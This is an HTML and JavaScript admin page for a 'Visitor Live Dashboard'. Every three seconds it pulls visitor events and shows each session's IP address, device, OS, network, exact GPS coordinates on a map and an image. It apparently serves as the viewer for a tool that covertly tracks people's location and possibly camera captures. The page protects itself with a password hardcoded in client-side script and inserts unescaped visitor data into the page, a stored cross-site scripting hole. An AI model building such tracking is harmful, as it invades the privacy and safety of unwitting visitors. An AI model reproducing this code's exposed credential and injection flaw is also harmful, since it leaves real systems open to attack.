<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Visitor Dashboard</title>

<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />

<style>
body {
  margin:0;
  font-family: system-ui;
  background: linear-gradient(135deg,#0f172a,#1e293b);
  color:#fff;
}

/* HEADER */
.header {
  padding:15px 25px;
  font-size:20px;
  font-weight:600;
  background: rgba(255,255,255,0.05);
  backdrop-filter: blur(10px);
}

/* LOGIN */
.login-box {
  max-width:320px;
  margin:80px auto;
  background:#fff;
  color:#000;
  padding:25px;
  border-radius:12px;
}

input {
  width:100%;
  padding:10px;
  margin-top:10px;
}

button {
  margin-top:10px;
  width:100%;
  padding:10px;
  background:#2563eb;
  color:#fff;
  border:none;
  cursor:pointer;
}

/* DASHBOARD */
.container {
  padding:20px;
  display:none;
}

/* CARDS GRID */
.grid {
  display:grid;
  grid-template-columns: repeat(auto-fill,minmax(320px,1fr));
  gap:15px;
}

/* CARD */
.card {
  background: rgba(255,255,255,0.05);
  border-radius:12px;
  padding:15px;
  backdrop-filter: blur(10px);
  transition:0.2s;
}

.card:hover {
  transform: scale(1.02);
}

/* STATUS */
.status {
  font-size:12px;
  padding:3px 8px;
  border-radius:6px;
}

.live { background:#16a34a; }
.idle { background:#6b7280; }

/* MAP */
.map {
  height:150px;
  margin-top:10px;
  border-radius:10px;
}

/* IMAGE */
img {
  width:100%;
  border-radius:10px;
  margin-top:10px;
}
</style>
</head>

<body>

<div class="header">📡 Visitor Live Dashboard</div>

<!-- LOGIN -->
<div class="login-box" id="login">
  <h3>Admin Login</h3>
  <input type="password" id="pass" placeholder="Enter password">
  <button onclick="login()">Login</button>
</div>

<!-- DASHBOARD -->
<div class="container" id="app">
  <div class="grid" id="grid"></div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script>
const API = "/api/events";
const PASSWORD = "Dhaval$3344"; // match env

let maps = {};

// LOGIN
function login(){
  if(document.getElementById("pass").value === PASSWORD){
    document.getElementById("login").style.display="none";
    document.getElementById("app").style.display="block";
    load();
    setInterval(load, 3000); // LIVE REFRESH
  } else {
    alert("Wrong password");
  }
}

// LOAD DATA
async function load(){
  const res = await fetch(API);
  const data = await res.json();

  const grid = document.getElementById("grid");
  grid.innerHTML = "";

  data.reverse().forEach(v => {
    const card = document.createElement("div");
    card.className="card";

    const isLive = (Date.now() - new Date(v.updated)) < 15000;

    card.innerHTML = `
      <b>${formatTime(v.updated)}</b>
      <span class="status ${isLive ? "live":"idle"}">
        ${isLive ? "LIVE":"IDLE"}
      </span>

      <div>🌐 ${v.ip || "-"}</div>
      <div>📱 ${shortDevice(v.device)}</div>
      <div>💻 ${v.os || "-"}</div>
      <div>🌍 ${getBrowser(v.device)}</div>
      <div>📡 ${v.network || "-"}</div>

      <a href="https://maps.google.com/?q=${v.lat},${v.lng}" target="_blank">
        📍 Open Map
      </a>

      ${v.image ? `<img src="${v.image}">` : ""}

      <div id="map_${v.session_id}" class="map"></div>
    `;

    grid.appendChild(card);

    if(v.lat && v.lng){
      setTimeout(()=>initMap(v),100);
    }
  });
}

// MAP INIT
function initMap(v){
  const id = "map_"+v.session_id;

  if(maps[id]) return;

  const map = L.map(id).setView([v.lat, v.lng], 13);

  L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png").addTo(map);

  L.marker([v.lat, v.lng]).addTo(map);

  maps[id]=map;
}

// HELPERS
function formatTime(t){
  return new Date(t).toLocaleString();
}

function shortDevice(ua=""){
  if(ua.includes("Android")) return "Android";
  if(ua.includes("iPhone")) return "iPhone";
  if(ua.includes("Windows")) return "Windows";
  return "Unknown";
}

function getBrowser(ua=""){
  if(ua.includes("Chrome")) return "Chrome";
  if(ua.includes("Safari")) return "Safari";
  if(ua.includes("Firefox")) return "Firefox";
  return "Unknown";
}
</script>

</body>
</html>
